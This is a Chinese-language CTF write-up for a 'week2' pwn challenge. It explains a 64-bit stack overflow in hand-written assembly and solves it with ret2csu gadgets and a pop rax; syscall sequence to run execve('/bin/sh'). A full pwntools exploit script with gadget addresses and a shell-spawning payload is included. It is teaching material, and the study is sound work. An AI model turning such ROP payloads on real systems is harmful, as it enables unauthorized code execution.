# week2Pwn题滞销,你们还是没有帮到我

## 题目简述

程序在手写汇编中把 `rsp` 当作 `read` 缓冲区，只分配 `0x20` 字节却读取 `0x100` 字节，形成 64 位栈溢出。附件无 PIE，含有 `/bin/sh` 字符串和 `syscall` 指令，但缺少直接控制全部参数寄存器的短 gadget，因此需要用 ret2csu 设置 `rdi`、`rsi`、`rdx`，再执行 `execve("/bin/sh", 0, 0)`。

关键源码为：

```c
void func()
{
    __asm__("sub rsp,0x20;"
            "mov rsi,rsp;"
            "mov rdi,0;"
            "mov rdx,0x100;"
            "mov rbx,0;"
            "push rbx;"
            "pop rax;"
            "syscall;"
            "add rsp,0x20;");
}
```

## 解题过程

函数序言还会保存 8 字节 `rbp`，所以从输入起点到返回地址的偏移为：

$$
0x20+0x8=0x28
$$

程序中的 `pop rax; syscall` 位于 `0x401153`；提示字符串内部的 `/bin/sh` 位于 `0x402016`。`__libc_csu_init` 提供两段 gadget：

```asm
; 0x4011f2
pop rbx
pop rbp
pop r12
pop r13
pop r14
pop r15
ret

; 0x4011d8
mov rdx, r14
mov rsi, r13
mov edi, r12d
call qword ptr [r15 + rbx*8]
add rbx, 1
cmp rbp, rbx
jne 0x4011d8
add rsp, 8
pop rbx
pop rbp
pop r12
pop r13
pop r14
pop r15
ret
```

设置 `rbx=0`、`rbp=1`，可让间接调用只执行一次。令 `r12=/bin/sh`、`r13=0`、`r14=0`，分别得到 `rdi`、`rsi`、`rdx`；`r15` 指向 `alarm@got`，使 CSU 中的间接调用落到一个可正常返回的已解析函数。清理 CSU 栈帧后，跳到 `pop rax; syscall`，把 `rax` 设为 59，即 AMD64 的 `execve` 系统调用号。

```python
from pwn import *

context.binary = elf = ELF("./main", checksec=False)

pop_csu = 0x4011F2
call_csu = 0x4011D8
pop_rax_syscall = 0x401153
bin_sh = 0x402016


def start():
    if args.REMOTE:
        return remote(args.HOST, int(args.PORT))
    return process(elf.path)


io = start()
payload = flat(
    b"A" * 0x28,
    pop_csu,
    0,                    # rbx
    1,                    # rbp，循环一次后 rbx == rbp
    bin_sh,               # r12 -> edi
    0,                    # r13 -> rsi
    0,                    # r14 -> rdx
    elf.got["alarm"],     # r15，间接调用 alarm
    call_csu,
    0, 0, 0, 0, 0, 0, 0, # add rsp,8 和六个 pop
    pop_rax_syscall,
    59,
)

io.send(payload)
io.interactive()
```

`mov edi, r12d` 只写入低 32 位，但 `/bin/sh` 位于 `0x402016`，地址低于 $2^{32}$，因此不会被截断破坏。

## 方法总结

- 核心技巧：用 CSU gadget 一次性设置 `rdi/rsi/rdx`，再借程序内的 `pop rax; syscall` 执行 `execve`。
- 识别信号：存在栈溢出和 `syscall`，但常规 `pop rdx` 等 gadget 缺失；二进制无 PIE 且含目标字符串。
- 复用要点：ret2csu 必须处理循环条件、间接调用目标和 7 个清理槽位；还要确认 32 位 `edi` 写入不会截断高地址。
